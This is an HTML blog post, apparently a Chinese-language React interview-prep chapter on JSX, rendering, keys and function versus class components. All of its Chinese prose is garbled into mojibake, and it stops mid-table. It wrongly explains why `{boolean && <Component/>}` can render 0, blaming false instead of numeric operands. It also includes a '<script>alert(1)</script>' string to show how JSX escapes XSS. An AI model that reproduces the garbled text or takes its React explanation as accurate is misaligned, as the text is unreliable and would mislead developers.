    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« ï¼šReact-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"><a href="#ç¬¬ä¸€ç« ï¼šReact-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="ç¬¬ä¸€ç« ï¼šReact åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"></a>ç¬¬ä¸€ç« ï¼šReact åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ</h1><h2 id="1-1-React-ç®€ä»‹ä¸è®¾è®¡å“²å­¦ï¼ˆç»„ä»¶åŒ–ã€å£°æ˜å¼-UIï¼‰"><a href="#1-1-React-ç®€ä»‹ä¸è®¾è®¡å“²å­¦ï¼ˆç»„ä»¶åŒ–ã€å£°æ˜å¼-UIï¼‰" class="headerlink" title="1.1 React ç®€ä»‹ä¸è®¾è®¡å“²å­¦ï¼ˆç»„ä»¶åŒ–ã€å£°æ˜å¼ UIï¼‰"></a>1.1 React ç®€ä»‹ä¸è®¾è®¡å“²å­¦ï¼ˆç»„ä»¶åŒ–ã€å£°æ˜å¼ UIï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p><strong>React æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>Facebook æ¨å‡ºçš„ç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„ JavaScript åº“ï¼Œæ ¸å¿ƒè§£å†³ UI ç»„ä»¶åŒ–å¼€å‘é—®é¢˜ã€‚</p><p><strong>ä¸¤å¤§è®¾è®¡å“²å­¦</strong></p><ul><li>ç»„ä»¶åŒ– (Component-Based)ï¼šå°† UI æ‹†åˆ†ä¸ºç‹¬ç«‹ã€å¯å¤ç”¨çš„ä»£ç å•å…ƒï¼ˆç»„ä»¶ï¼‰ï¼Œæ¯ä¸ªç»„ä»¶ç®¡ç†è‡ªèº«çŠ¶æ€ä¸é€»è¾‘ã€‚<em>ç¤ºä¾‹ï¼š<code>&lt;Button /&gt;</code>, <code>&lt;Card /&gt;</code> ç­‰</em></li><li>å£°æ˜å¼ UI (Declarative)ï¼šå¼€å‘è€…åªéœ€æè¿°â€œUI åº”è¯¥æ˜¯ä»€ä¹ˆæ ·å­â€ï¼ˆWhatï¼‰ï¼Œè€Œéâ€œå¦‚ä½•æ›´æ–°åˆ°è¯¥çŠ¶æ€â€ï¼ˆHowï¼‰ã€‚<em>å¯¹æ¯”å‘½ä»¤å¼ï¼šç›´æ¥æ“ä½œ DOM vs. è¿”å› JSX æè¿°ç»“æ„</em></li></ul><span id="more"></span><h3 id="æ·±å…¥åŸç†ä¸é¢è¯•è€ƒç‚¹"><a href="#æ·±å…¥åŸç†ä¸é¢è¯•è€ƒç‚¹" class="headerlink" title="æ·±å…¥åŸç†ä¸é¢è¯•è€ƒç‚¹"></a>æ·±å…¥åŸç†ä¸é¢è¯•è€ƒç‚¹</h3><p><strong>ç»„ä»¶åŒ–èƒŒåçš„æ ¸å¿ƒæ€æƒ³</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¯´æ˜</th><th align="left">é¢è¯•ä¸¾ä¾‹</th></tr></thead><tbody><tr><td align="left">å°è£…æ€§</td><td align="left">ç»„ä»¶å†…éƒ¨çŠ¶æ€&#x2F;é€»è¾‘å¯¹å¤–éšè—ï¼Œä»…é€šè¿‡ Props é€šä¿¡</td><td align="left">â€œä¸ºä½• React æ¨èå•å‘æ•°æ®æµï¼Ÿâ€</td></tr><tr><td align="left">ç»„åˆæ€§</td><td align="left">é€šè¿‡åµŒå¥—ç»„ä»¶æ„å»ºå¤æ‚ UIï¼ˆå¦‚ <code>&lt;Form&gt;&lt;Input/&gt;&lt;Button/&gt;&lt;/Form&gt;</code>ï¼‰</td><td align="left">â€œå¦‚ä½•è®¾è®¡å¯å¤ç”¨çš„é«˜é˜¶ç»„ä»¶ï¼Ÿâ€</td></tr><tr><td align="left">å¤ç”¨æ€§</td><td align="left">åŒä¸€ç»„ä»¶åœ¨ä¸åŒåœºæ™¯é‡å¤ä½¿ç”¨</td><td align="left">â€œå—æ§ç»„ä»¶ä¸éå—æ§ç»„ä»¶é€‚ç”¨åœºæ™¯å·®å¼‚ï¼Ÿâ€</td></tr></tbody></table><p><strong>å£°æ˜å¼ UI çš„åº•å±‚å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å£°æ˜å¼å†™æ³•ï¼ˆWhatï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(count + 1)&#125;&gt;&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// å¯¹åº”çš„å‘½ä»¤å¼é€»è¾‘ï¼ˆHowï¼‰</span><br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;<br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  count++;<br>  button.<span class="hljs-property">textContent</span> = count; <span class="hljs-comment">// éœ€æ‰‹åŠ¨æ›´æ–° DOM</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>å…³é”®ä¼˜åŠ¿ï¼š</p><ul><li>é¿å…ç›´æ¥æ“ä½œ DOM â†’ å‡å°‘ä»£ç å¤æ‚åº¦ä¸æ½œåœ¨ Bug</li><li>ä¸çŠ¶æ€ç»‘å®š â†’ UI è‡ªåŠ¨éšçŠ¶æ€æ›´æ–°ï¼ˆé€šè¿‡ Virtual DOM åè°ƒï¼‰</li></ul><p><strong>è™šæ‹Ÿ DOM (Virtual DOM) çš„è§’è‰²</strong></p><pre class="mermaid">graph LRA[ç»„ä»¶çŠ¶æ€å˜åŒ–] --> B{ç”Ÿæˆæ–° Virtual DOM}B --> C[å¯¹æ¯”æ–°æ—§ Virtual DOM]C --> D[è®¡ç®—æœ€å° DOM å˜æ›´]D --> E[æ‰¹é‡æ›´æ–°çœŸå® DOM]</pre><p>è®¾è®¡å“²å­¦å…³è”ï¼šå£°æ˜å¼ UI ä¾èµ– Virtual DOM å®ç°é«˜æ•ˆçš„ â€œçŠ¶æ€åˆ° UI çš„æ˜ å°„â€ï¼Œå¼€å‘è€…æ— éœ€å…³æ³¨æ›´æ–°è¿‡ç¨‹ã€‚</p><h3 id="é¢è¯•è¯æœ¯æŠ€å·§"><a href="#é¢è¯•è¯æœ¯æŠ€å·§" class="headerlink" title="é¢è¯•è¯æœ¯æŠ€å·§"></a>é¢è¯•è¯æœ¯æŠ€å·§</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆ React é‡‡ç”¨å£°æ˜å¼è€Œéå‘½ä»¤å¼ï¼Ÿ</strong></p><p>å£°æ˜å¼è®©ä»£ç æ›´ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘çš„æè¿°ï¼ˆWhatï¼‰ï¼Œå°†åº•å±‚ DOM æ“ä½œäº¤ç»™ React çš„ Virtual DOM åè°ƒæœºåˆ¶å¤„ç†ã€‚è¿™å¸¦æ¥ä¸‰æ–¹é¢ä¼˜åŠ¿ï¼š</p><ol><li>å¯ç»´æŠ¤æ€§ï¼šçŠ¶æ€å˜åŒ–è‡ªåŠ¨è§¦å‘ UI æ›´æ–°ï¼Œé¿å…æ‰‹åŠ¨ DOM æ“ä½œå¯¼è‡´çš„é€»è¾‘åˆ†æ•£</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šReact é€šè¿‡ Diff ç®—æ³•æ‰¹é‡ DOM æ›´æ–°ï¼Œå‡å°‘é‡ç»˜å¼€é”€</li><li>å¼€å‘ä½“éªŒï¼šæ›´æ¥è¿‘è‡ªç„¶æ€ç»´æ¨¡å¼çš„ UI æ„å»ºæ–¹å¼ï¼Œæå‡å¼€å‘æ•ˆç‡â€</li></ol><h3 id="å»¶ä¼¸è€ƒç‚¹"><a href="#å»¶ä¼¸è€ƒç‚¹" class="headerlink" title="å»¶ä¼¸è€ƒç‚¹"></a>å»¶ä¼¸è€ƒç‚¹</h3><ul><li>JSX çš„æœ¬è´¨ï¼šå£°æ˜å¼ UI çš„è¯­æ³•ç³–ï¼ˆç¼–è¯‘ä¸º React.createElement()ï¼‰</li><li>ç»„ä»¶åŒ–ä¸è®¾è®¡æ¨¡å¼ï¼šå¤åˆç»„ä»¶ (Compound Components)ã€å®¹å™¨&#x2F;å±•ç¤ºç»„ä»¶ç­‰</li></ul><h2 id="1-2-JSX-è¯­æ³•ä¸æ¸²æŸ“é€»è¾‘ï¼ˆè¡¨è¾¾å¼ã€æ¡ä»¶æ¸²æŸ“ã€åˆ—è¡¨æ¸²æŸ“ï¼‰"><a href="#1-2-JSX-è¯­æ³•ä¸æ¸²æŸ“é€»è¾‘ï¼ˆè¡¨è¾¾å¼ã€æ¡ä»¶æ¸²æŸ“ã€åˆ—è¡¨æ¸²æŸ“ï¼‰" class="headerlink" title="1.2 JSX è¯­æ³•ä¸æ¸²æŸ“é€»è¾‘ï¼ˆè¡¨è¾¾å¼ã€æ¡ä»¶æ¸²æŸ“ã€åˆ—è¡¨æ¸²æŸ“ï¼‰"></a>1.2 JSX è¯­æ³•ä¸æ¸²æŸ“é€»è¾‘ï¼ˆè¡¨è¾¾å¼ã€æ¡ä»¶æ¸²æŸ“ã€åˆ—è¡¨æ¸²æŸ“ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µç®€è¿°"><a href="#åŸºç¡€æ¦‚å¿µç®€è¿°" class="headerlink" title="åŸºç¡€æ¦‚å¿µç®€è¿°"></a>åŸºç¡€æ¦‚å¿µç®€è¿°</h3><p><strong>JSX æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>JavaScript è¯­æ³•æ‰©å±•ï¼Œå…è®¸åœ¨ JavaScript ä¸­ç¼–å†™ç±»ä¼¼ HTML çš„ç»“æ„ï¼ˆè¯­æ³•ç³–ï¼‰</p><p><strong>ä¸‰å¤§æ ¸å¿ƒåŠŸèƒ½</strong></p><ul><li>è¡¨è¾¾å¼åµŒå…¥ï¼š{ } åŒ…è£¹ä»»æ„ JavaScript è¡¨è¾¾å¼</li><li>æ¡ä»¶æ¸²æŸ“ï¼šä¸‰å…ƒè¿ç®—ç¬¦ ? : æˆ– &amp;&amp; çŸ­è·¯è¿ç®—</li><li>åˆ—è¡¨æ¸²æŸ“ï¼šmap() + key å±æ€§ç”Ÿæˆå…ƒç´ åˆ—è¡¨</li></ul><h3 id="æ ¸å¿ƒæœºåˆ¶ä¸æ·±åº¦åŸç†"><a href="#æ ¸å¿ƒæœºåˆ¶ä¸æ·±åº¦åŸç†" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶ä¸æ·±åº¦åŸç†"></a>æ ¸å¿ƒæœºåˆ¶ä¸æ·±åº¦åŸç†</h3><p><strong>JSX ç¼–è¯‘åŸç†ï¼ˆBabel è½¬æ¢è¿‡ç¨‹ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹ JSX</span><br><span class="hljs-keyword">const</span> element = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>Hello &#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br><br><span class="hljs-comment">// Babel ç¼–è¯‘åï¼ˆReact 17+ æ— éœ€æ˜¾å¼å¼•å…¥ Reactï¼‰</span><br><span class="hljs-keyword">import</span> &#123; jsx <span class="hljs-keyword">as</span> _jsx &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react/jsx-runtime&quot;</span>;<br><span class="hljs-keyword">const</span> element = <span class="hljs-title function_">_jsx</span>(<span class="hljs-string">&quot;div&quot;</span>, &#123;<br>  <span class="hljs-attr">className</span>: <span class="hljs-string">&quot;container&quot;</span>,<br>  <span class="hljs-attr">children</span>: [<span class="hljs-string">&quot;Hello &quot;</span>, name]<br>&#125;);<br></code></pre></td></tr></table></figure><p>å…³é”®ç‚¹ï¼š</p><ul><li>JSX æœ¬è´¨æ˜¯ React.createElement(type, props, children) çš„è¯­æ³•ç³–</li><li>æ¯ä¸ª JSX å…ƒç´ ä¼šè¢«ç¼–è¯‘ä¸º è™šæ‹Ÿ DOM å¯¹è±¡ï¼ˆåŒ…å« type, props, key ç­‰å±æ€§ï¼‰</li></ul><p><strong>è¡¨è¾¾å¼åµŒå…¥çš„è¿è¡Œæ—¶æœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">// è¡¨è¾¾å¼æ‰§è¡Œå‘ç”Ÿåœ¨ç»„ä»¶ render é˜¶æ®µ</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å½“å‰ç”¨æˆ·: &#123;props.user ?? &#x27;æ¸¸å®¢&#x27;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>è¡¨è¾¾å¼å†…ä¸èƒ½ä½¿ç”¨è¯­å¥ï¼ˆå¦‚ if&#x2F;forï¼‰</li><li>è¡¨è¾¾å¼ç»“æœç±»å‹è‡ªåŠ¨è½¬æ¢ï¼š<ul><li>undefined&#x2F;null&#x2F;true&#x2F;false â†’ ä¸æ¸²æŸ“</li><li>æ•°ç»„ â†’ å±•å¼€æ¸²æŸ“ï¼ˆéœ€åŒ…å«æœ‰æ•ˆå…ƒç´ ï¼‰</li><li>å¯¹è±¡ â†’ æŠ›å‡ºé”™è¯¯ï¼ˆé™¤ç‰¹æ®Šå¯¹è±¡å¦‚ ReactElementï¼‰</li></ul></li></ul><p><strong>æ¡ä»¶æ¸²æŸ“çš„åº•å±‚å®ç°ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä¸‰å…ƒè¡¨è¾¾å¼ï¼ˆé€‚åˆç®€å•åˆ†æ”¯ï¼‰</span><br>&#123; isLoggedIn ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LogoutButton</span> /&gt;</span></span> : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LoginButton</span> /&gt;</span></span> &#125;<br><br><span class="hljs-comment">// æ–¹æ¡ˆ2ï¼š&amp;&amp; çŸ­è·¯ï¼ˆé€‚åˆå•åˆ†æ”¯ï¼‰</span><br>&#123; hasUnread &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Badge</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;unreadCount&#125;</span> /&gt;</span></span> &#125;<br><br><span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šç«‹å³æ‰§è¡Œå‡½æ•°ï¼ˆå¤æ‚é€»è¾‘ - ä¸æ¨èï¼‰</span><br>&#123; (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (conditionA) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span></span>;<br>    <span class="hljs-keyword">if</span> (conditionB) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ComponentB</span> /&gt;</span></span>;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Fallback</span> /&gt;</span></span>;<br>  &#125;)() <br>&#125;<br></code></pre></td></tr></table></figure><p>æ€§èƒ½ä¼˜åŒ–ï¼šæ¡ä»¶å˜åŒ–æ—¶ï¼ŒReact é€šè¿‡ Diff ç®—æ³• å¤ç”¨ç›¸åŒå­ç»„ä»¶ï¼ˆæŒ‰ç»„ä»¶ä½ç½®æ¯”å¯¹ï¼‰</p><p><strong>åˆ—è¡¨æ¸²æŸ“çš„ key æœºåˆ¶</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> todoItems = todos.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span>&gt;</span>  // â­ å…³é”®ç‚¹ï¼škey å¿…é¡»æ˜¯ç¨³å®šå”¯ä¸€æ ‡è¯†</span><br><span class="language-xml">    &#123;todo.text&#125;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>));<br></code></pre></td></tr></table></figure><p>æ—  key çš„éšæ‚£ï¼š</p><ul><li>åˆ—è¡¨é¡ºåºå˜åŒ–æ—¶å¼•å‘ç»„ä»¶çŠ¶æ€é”™ä¹±ï¼ˆå¦‚è¾“å…¥æ¡†å†…å®¹é”™ä½ï¼‰</li><li>æ€§èƒ½ä¸‹é™ï¼šå…¨é‡æ¯”å¯¹å­å…ƒç´ ï¼ˆæ—¶é—´å¤æ‚åº¦ O(nÂ²)ï¼‰</li></ul><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æŠ€å·§</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆ JSX ä¸­ <code>&#123;boolean &amp;&amp; &lt;Component/&gt;&#125;</code> å¯èƒ½æ¸²æŸ“ 0ï¼Ÿ</strong></p><p>true &amp;&amp; jsx è¿”å› jsxï¼Œä½† false &amp;&amp; jsx è¿”å› false â†’ React å°† false æ¸²æŸ“ä¸ºç©ºç™½å ä½ç¬¦ï¼ˆç±»ä¼¼ nullï¼‰ï¼Œå¯¼è‡´ DOM ä¸­å‡ºç°ç©ºæ–‡æœ¬èŠ‚ç‚¹ã€‚</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è½¬æ¢ä¸º null é¿å…ç©ºèŠ‚ç‚¹</span><br>&#123; shouldRender &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> /&gt;</span></span> || <span class="hljs-literal">null</span> &#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šåˆ—è¡¨æ¸²æŸ“ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ index ä½œä¸º keyï¼Ÿ</strong></p><p>å½“åˆ—è¡¨å‘ç”Ÿå¢åˆ æˆ–æ’åºæ—¶ï¼š</p><ul><li>index å˜åŒ–å¯¼è‡´ç»„ä»¶è¢«æ„å¤–é”€æ¯é‡å»ºï¼ˆçŠ¶æ€ä¸¢å¤±ï¼‰</li><li>Diff ç®—æ³•æ— æ³•å‡†ç¡®å®šä½èŠ‚ç‚¹å˜åŒ–</li><li>æ­£ç¡®åšæ³•ï¼šä½¿ç”¨æ•°æ®å”¯ä¸€ IDï¼ˆå¦‚ todo.idï¼‰</li></ul><p><strong>Qï¼šJSX å¦‚ä½•é˜²æ­¢ XSS æ”»å‡»ï¼Ÿ</strong></p><p>JSX åœ¨æ‰§è¡Œè¡¨è¾¾å¼æ’å…¥æ—¶è‡ªåŠ¨è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> title = <span class="hljs-string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span> <br><span class="hljs-comment">// æ¸²æŸ“ä¸ºï¼š&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span><br></code></pre></td></tr></table></figure><p>ä¾‹å¤–ï¼šdangerouslySetInnerHTML éœ€æ‰‹åŠ¨é˜²èŒƒ</p><h2 id="1-3-ç»„ä»¶åŸºç¡€ï¼ˆå‡½æ•°ç»„ä»¶-vs-ç±»ç»„ä»¶ï¼‰"><a href="#1-3-ç»„ä»¶åŸºç¡€ï¼ˆå‡½æ•°ç»„ä»¶-vs-ç±»ç»„ä»¶ï¼‰" class="headerlink" title="1.3 ç»„ä»¶åŸºç¡€ï¼ˆå‡½æ•°ç»„ä»¶ vs. ç±»ç»„ä»¶ï¼‰"></a>1.3 ç»„ä»¶åŸºç¡€ï¼ˆå‡½æ•°ç»„ä»¶ vs. ç±»ç»„ä»¶ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-1"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-1" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">å‡½æ•°ç»„ä»¶</th><th align="left">ç±»ç»„ä»¶</th></tr></thead><tbody><tr><td align="left">å®šä¹‰æ–¹å¼</td><td align="left">JavaScript å‡½æ•°</td><td align="left">ES6 class ç»§æ‰¿ React.Component</td></tr><tr><td align="left">çŠ¶æ€ç®¡ç†</td><td align="left">useState Hook (React 16.8+)</td><td align="left">this.state + setState</td></tr><tr><td align="left">ç”Ÿå‘½å‘¨æœŸ</td><td align="left">useEffect Hook</td><td align="left">ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼ˆcomponentDidMountç­‰ï¼‰</td></tr><tr><td align="left">ä»£ç é‡</td><td align="left">æ›´ç®€æ´</td><td align="left">ç›¸å¯¹å†—é•¿</td></tr><tr><td align="left">æ¨èåœºæ™¯</td><td align="left">ç°ä»£ React å¼€å‘é¦–é€‰</td><td align="left">é—ç•™é¡¹ç›®æˆ–éœ€è¦ Error Boundaries æ—¶</td></tr></tbody></table><h3 id="æ ¸å¿ƒæœºåˆ¶ä¸å·®å¼‚æ·±åº¦è§£æ"><a href="#æ ¸å¿ƒæœºåˆ¶ä¸å·®å¼‚æ·±åº¦è§£æ" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶ä¸å·®å¼‚æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶ä¸å·®å¼‚æ·±åº¦è§£æ</h3><p><strong>æ¸²æŸ“é€»è¾‘æœ¬è´¨åŒºåˆ«</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‡½æ•°ç»„ä»¶ï¼šçº¯å‡½æ•°æ‰§è¡Œ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// ç±»ç»„ä»¶ï¼šå®ä¾‹åŒ–åè°ƒç”¨ render æ–¹æ³•</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Welcome</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®å·®å¼‚ï¼š</p><ul><li>å‡½æ•°ç»„ä»¶ï¼šç›´æ¥è¿”å› JSXï¼Œæ¯æ¬¡æ¸²æŸ“éƒ½æ˜¯ç‹¬ç«‹å‡½æ•°è°ƒç”¨</li><li>ç±»ç»„ä»¶ï¼šé€šè¿‡ å®ä¾‹åŒ– â†’ è°ƒç”¨ render() è¿”å› JSXï¼Œå®ä¾‹åœ¨æ›´æ–°é—´ä¿æŒ</li></ul><p><strong>çŠ¶æ€ç®¡ç†çš„åº•å±‚å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‡½æ•°ç»„ä»¶ï¼šé—­åŒ…å­˜å‚¨çŠ¶æ€ï¼ˆHook é“¾è¡¨ç»“æ„ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <br>  <span class="hljs-comment">// React å†…éƒ¨é€šè¿‡é¡ºåºç´¢å¼•å…³è”çŠ¶æ€</span><br>&#125;<br><br><span class="hljs-comment">// ç±»ç»„ä»¶ï¼šå®ä¾‹å±æ€§å­˜å‚¨çŠ¶æ€</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;;<br>  <br>  increment = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>çŠ¶æ€æ›´æ–°å·®å¼‚ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">å‡½æ•°ç»„ä»¶</th><th align="left">ç±»ç»„ä»¶</th></tr></thead><tbody><tr><td align="left">æ›´æ–°æœºåˆ¶</td><td align="left">é—­åŒ…æ•è·å½“æ¬¡æ¸²æŸ“çŠ¶æ€</td><td align="left">å§‹ç»ˆè¯»å–æœ€æ–° this.state</td></tr><tr><td align="left">æ‰¹å¤„ç†</td><td align="left">è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆReact 18+ï¼‰</td><td align="left">éœ€ unstable_batchedUpdates</td></tr><tr><td align="left">å¼‚æ­¥æ€§</td><td align="left">çŠ¶æ€æ›´æ–°é˜Ÿåˆ—</td><td 